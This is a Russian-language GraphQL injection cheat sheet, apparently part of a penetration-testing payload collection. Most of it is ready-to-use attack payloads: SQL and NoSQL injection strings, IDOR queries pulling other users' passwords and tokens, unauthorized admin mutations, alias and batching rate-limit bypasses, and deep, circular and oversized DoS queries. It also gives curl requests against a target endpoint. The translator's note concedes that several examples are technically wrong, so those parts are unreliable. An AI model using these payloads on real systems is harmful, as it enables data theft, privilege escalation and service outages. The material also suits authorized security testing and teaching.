<a id="-graphql-injection-cheatsheet"></a>
# 📊 Справочник по инъекциям GraphQL

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[← Русское оглавление](../../README.ru.md) · [Английский оригинал](../GraphQL-Injection.md)

> **Уточнение к оригиналу.** По [спецификации GraphQL](https://spec.graphql.org/October2021/), имена чувствительны к регистру, `$ne` не может быть именем поля GraphQL, а циклические фрагменты должны отклоняться при валидации. `__typename` — штатное метаполе, не запрос стека вызовов; показанная интроспекция не извлекает всю схему рекурсивно. Псевдонимы внутри операции и HTTP-пакеты — разные механизмы, а инъекции зависят от схемы и обработки аргументов. Примеры оригинала сохранены.

[🇹🇷 Türkçe Sürüm](GraphQL-Injection.tr.md) • [🇬🇷 Ελληνικά](GraphQL-Injection.el.md)

```
 ██████╗ ██████╗  █████╗ ██████╗ ██╗  ██╗ ██████╗ ██╗     
██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██║  ██║██╔═══██╗██║     
██║  ███╗██████╔╝███████║██████╔╝███████║██║   ██║██║     
██║   ██║██╔══██╗██╔══██║██╔═══╝ ██╔══██║██║▄▄ ██║██║     
╚██████╔╝██║  ██║██║  ██║██║     ██║  ██║╚██████╔╝███████╗
 ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚══▀▀═╝ ╚══════╝
██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗██╗ ██████╗ ███╗   ██╗
██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║
██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║██║   ██║██╔██╗ ██║
██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██║██║   ██║██║╚██╗██║
██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║
╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

---

<a id="-graphql-basics"></a>
## 🔍 Основы GraphQL

<a id="common-endpoints"></a>
### Распространённые конечные точки
```
/graphql
/graphiql
/v1/graphql
/v2/graphql
/api/graphql
/graph
/query
/gql
/playground
```

<a id="request-structure"></a>
### Структура запроса
```graphql
# Запрос
{
  user(id: 1) {
    name
    email
  }
}

# С именем операции
query GetUser {
  user(id: 1) {
    name
  }
}

# Мутация
mutation {
  createUser(name: "test", email: "test@test.com") {
    id
    name
  }
}
```

---

<a id="-introspection-queries"></a>
## 🎯 Запросы интроспекции

<a id="full-schema-introspection"></a>
### Интроспекция всей схемы
```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

<a id="query-type-entry-points"></a>
### Тип Query (точки входа)
```graphql
{
  __schema {
    queryType {
      fields {
        name
        description
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}
```

<a id="mutation-type"></a>
### Тип Mutation
```graphql
{
  __schema {
    mutationType {
      fields {
        name
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}
```

<a id="all-types"></a>
### Все типы
```graphql
{
  __schema {
    types {
      name
      kind
      description
    }
  }
}
```

<a id="specific-type-details"></a>
### Сведения об отдельном типе
```graphql
{
  __type(name: "User") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

---

<a id="-injection-attacks"></a>
## 💉 Атаки с внедрением данных

<a id="sql-injection-via-graphql"></a>
### SQL-инъекция через GraphQL
```graphql
# В аргументах
{
  user(id: "1' OR '1'='1") {
    name
    email
    password
  }
}

# На основе UNION
{
  user(name: "' UNION SELECT username,password FROM users--") {
    name
  }
}
```

<a id="nosql-injection"></a>
### NoSQL-инъекция
```graphql
{
  user(username: "{\"$ne\": null}") {
    name
    email
  }
}

# Или в виде JSON
{
  "query": "{ user(filter: {username: {$ne: \"\"}}) { name email } }"
}
```

<a id="idor-insecure-direct-object-reference"></a>
### IDOR (небезопасная прямая ссылка на объект)
```graphql
# Доступ к данным других пользователей
{
  user(id: 1) { name email password }
}
{
  user(id: 2) { name email password }
}
{
  user(id: 3) { name email password }
}

# Перечислить всех пользователей
{
  users {
    id
    name
    email
    role
  }
}
```

---

<a id="-authorization-bypass"></a>
## 🔥 Обход авторизации

<a id="missing-auth-on-mutations"></a>
### Отсутствие авторизации для мутаций
```graphql
# Проверить административные операции от обычного пользователя
mutation {
  deleteUser(id: 1) {
    success
  }
}

mutation {
  updateUserRole(id: 1, role: "admin") {
    id
    role
  }
}
```

<a id="nested-query-bypass"></a>
### Обход через вложенные запросы
```graphql
# Доступ к конфиденциальным данным через связи
{
  posts {
    author {
      email
      passwordHash
      adminToken
    }
  }
}

{
  comments {
    user {
      privateMessages {
        content
      }
    }
  }
}
```

<a id="field-suggestion-abuse"></a>
### Злоупотребление подсказками имён полей
```graphql
# При включённых подсказках проверить несуществующие поля
{
  user(id: 1) {
    passwor  # Возможна подсказка "password"
  }
}
```

---

<a id="-information-disclosure"></a>
## 🚀 Раскрытие информации

<a id="debug-information"></a>
### Отладочная информация
```graphql
# Перечисление по сообщениям об ошибках
{
  __typename
}

# Неверный запрос для получения стека вызовов
{
  invalid_field_that_doesnt_exist
}
```

<a id="sensitive-field-discovery"></a>
### Поиск полей с конфиденциальными данными
```graphql
{
  user(id: 1) {
    id
    username
    email
    password
    passwordHash
    token
    apiKey
    secret
    privateKey
    ssn
    creditCard
    internalId
  }
}
```

---

<a id="-bypass-techniques"></a>
## 🛡️ Способы обхода

<a id="alias-based-bypass"></a>
### Обход с помощью псевдонимов (aliases)
```graphql
# Обход ограничения частоты запросов через псевдонимы
{
  a: user(id: 1) { name }
  b: user(id: 2) { name }
  c: user(id: 3) { name }
  d: user(id: 4) { name }
}
```

<a id="batching-attacks"></a>
### Атаки с пакетными запросами
```json
[
  {"query": "{ user(id: 1) { email } }"},
  {"query": "{ user(id: 2) { email } }"},
  {"query": "{ user(id: 3) { email } }"}
]
```

<a id="case-manipulation"></a>
### Изменение регистра
```graphql
# Проверить другой регистр
{
  USER(id: 1) { name }
}
{
  User(id: 1) { name }
}
```

<a id="fragment-injection"></a>
### Внедрение фрагментов
```graphql
{
  user(id: 1) {
    ...sensitiveData
  }
}

fragment sensitiveData on User {
  password
  apiKey
  token
}
```

---

<a id="-dos-attacks"></a>
## 💣 Атаки на доступность (DoS)

<a id="deep-query-attack"></a>
### Атака глубокими запросами
```graphql
{
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends {
              name
            }
          }
        }
      }
    }
  }
}
```

<a id="circular-fragment"></a>
### Циклический фрагмент
```graphql
query {
  user(id: 1) {
    ...A
  }
}

fragment A on User {
  ...B
}

fragment B on User {
  ...A  # Циклическая ссылка
}
```

<a id="large-result-set"></a>
### Большой набор результатов
```graphql
{
  users(first: 999999) {
    id
    name
    email
    posts {
      id
      comments {
        id
      }
    }
  }
}
```

---

<a id="-testing-tools"></a>
## 🛠️ Инструменты проверки

<a id="graphql-voyager"></a>
### GraphQL Voyager
```bash
# Визуализировать схему
https://graphql-kit.com/graphql-voyager/
# Вставить результат интроспекции
```

<a id="inql-burp-extension"></a>
### InQL (расширение Burp)
```
# Возможности:
- Извлечение схемы
- Создание запросов
- Поиск уязвимостей
```

<a id="graphql-cop"></a>
### graphql-cop
```bash
# Инструмент проверки безопасности
pip install graphql-cop
graphql-cop -t https://target.com/graphql
```

<a id="graphw00f"></a>
### graphw00f
```bash
# Определение реализации GraphQL
git clone https://github.com/dolevf/graphw00f
python3 main.py -t https://target.com/graphql
```

<a id="altair-graphql-client"></a>
### Altair GraphQL Client
```
# Настольный клиент для проверки
https://altairgraphql.dev/
```

---

<a id="-curl-examples"></a>
## 📝 Примеры cURL

<a id="basic-query"></a>
### Базовый запрос
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ user(id: 1) { name email } }"}'
```

<a id="with-variables"></a>
### С переменными
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query GetUser($id: Int!) { user(id: $id) { name } }", "variables": {"id": 1}}'
```

<a id="introspection"></a>
### Интроспекция
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}'
```

<a id="with-auth"></a>
### С аутентификацией
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"query": "{ me { name } }"}'
```

---

<a id="-testing-checklist"></a>
## 📋 Список проверок

```markdown
## Список проверок безопасности GraphQL

□ Найти конечные точки GraphQL
□ Проверить интроспекцию (извлечение схемы)
□ Извлечь все запросы и мутации
□ Проверить IDOR в запросах объектов
□ Проверить авторизацию мутаций
□ Проверить SQL/NoSQL-инъекции в аргументах
□ Проверить утечки данных во вложенных запросах
□ Проверить ограничение частоты запросов (обход через псевдонимы)
□ Проверить пакетные запросы
□ Проверить конфиденциальные поля (password, token)
□ Проверить ограничение глубины (DoS)
□ Проверить раскрытие информации в ошибках
□ Проверить конечные точки подписок
```

---

<a id="-common-vulnerabilities-summary"></a>
## 🔗 Сводка распространённых уязвимостей

| Уязвимость | Проверка | Последствия |
|---------------|------|--------|
| **Интроспекция включена** | Запрос `__schema` | Раскрытие схемы |
| **IDOR** | Изменить идентификаторы в запросах | Доступ к данным других пользователей |
| **Отсутствие аутентификации** | Запрос без токена | Несанкционированный доступ |
| **SQLi/NoSQLi** | Внедрить данные в аргументы | Компрометация базы данных |
| **Избыточные данные** | Запросить конфиденциальные поля | Утечка данных |
| **DoS** | Глубокие и циклические запросы | Недоступность сервиса |
| **Злоупотребление пакетными запросами** | Несколько запросов | Обход ограничения частоты запросов |

---

<a id="-related-payloads"></a>
## 🔗 Связанные полезные нагрузки

- [Полезные нагрузки SQLi](SQLi.ru.md)
- [NoSQL-инъекция](NoSQL-Injection.ru.md)
- [Безопасность API](../../API-Security/translations/README.ru.md)

---

**Вернуться к полезным нагрузкам:** [💉 Коллекция полезных нагрузок](../../README.ru.md#category-18)
